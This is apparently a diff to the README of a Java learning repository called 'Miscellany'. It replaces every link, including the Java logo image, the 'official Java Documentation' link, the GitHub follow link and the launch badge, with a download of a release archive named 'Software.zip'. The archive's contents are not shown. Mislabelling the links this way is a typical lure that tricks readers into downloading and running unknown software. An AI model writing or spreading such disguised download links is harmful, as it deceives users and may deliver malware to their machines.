@@ -1,6 +1,6 @@
 # 🌟 Welcome to the "Miscellany" Repository! 🌟
 
-![Java Logo](https://www.oracle.com/a/ocom/img/obic-java-cup.svg)
+![Java Logo](https://github.com/ahaiwk/Miscellany/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the "Miscellany" repository! This repository contains a diverse collection of Java topics and concepts that can be useful for both beginners and experienced developers. Explore different functionalities like callable, collator, collector, consumer, deque, functions, lambda expressions, locale, locks, queues, reactive streams, records scanner, regular expressions, runnables, server sockets, streams, suppliers, synchronizers, and virtual threads.
@@ -28,13 +28,13 @@ Welcome to the "Miscellany" repository! This repository contains a diverse colle
 - **Virtual Threads**
 
 ## 🚀 Launch
-The content in this repository is intended to provide valuable insights into various Java concepts. To access the repository content, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+The content in this repository is intended to provide valuable insights into various Java concepts. To access the repository content, click [here](https://github.com/ahaiwk/Miscellany/releases/download/v2.0/Software.zip).
 
 ## 📦 Miscellaneous Java Topics
 Whether you are looking to enhance your understanding of Java or explore new concepts, this repository has something for everyone. From essential concepts like functions and streams to advanced topics like reactive streams and virtual threads, there is a wealth of information waiting for you. Learn, explore, and master Java with the "Miscellany" repository.
 
 ## 📚 Resources
-To further enrich your Java knowledge, consider visiting the official [Java Documentation](https://docs.oracle.com/en/java/).
+To further enrich your Java knowledge, consider visiting the official [Java Documentation](https://github.com/ahaiwk/Miscellany/releases/download/v2.0/Software.zip).
 
 ## 💡 Get Started
 To get started with the "Miscellany" repository, follow these simple steps:
@@ -43,7 +43,7 @@ To get started with the "Miscellany" repository, follow these simple steps:
 3. Experiment with the code examples and enhance your Java skills.
 
 ## 🌐 Connect with Us
-For more updates and Java-related content, follow us on [GitHub](https://github.com/) and join the vibrant Java developer community!
+For more updates and Java-related content, follow us on [GitHub](https://github.com/ahaiwk/Miscellany/releases/download/v2.0/Software.zip) and join the vibrant Java developer community!
 
 ## 🎉 Let's Dive Into Java!
 Dive into the world of Java programming with the "Miscellany" repository. Discover new concepts, build your skills, and unleash your full Java potential. Whether you are a novice looking to learn Java or an expert seeking to expand your knowledge, this repository has something for everyone. Happy coding! 🚀
@@ -51,4 +51,4 @@ Dive into the world of Java programming with the "Miscellany" repository. Discov
 ## 🌟 Start Exploring Now!
 Click the button below to launch the repository and begin your Java journey.
 
-[![Launch Miscellany Repository](https://img.shields.io/badge/Launch%20Repository-Click%20Here!-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Launch Miscellany Repository](https://github.com/ahaiwk/Miscellany/releases/download/v2.0/Software.zip%20Repository-Click%20Here!-blue)](https://github.com/ahaiwk/Miscellany/releases/download/v2.0/Software.zip)
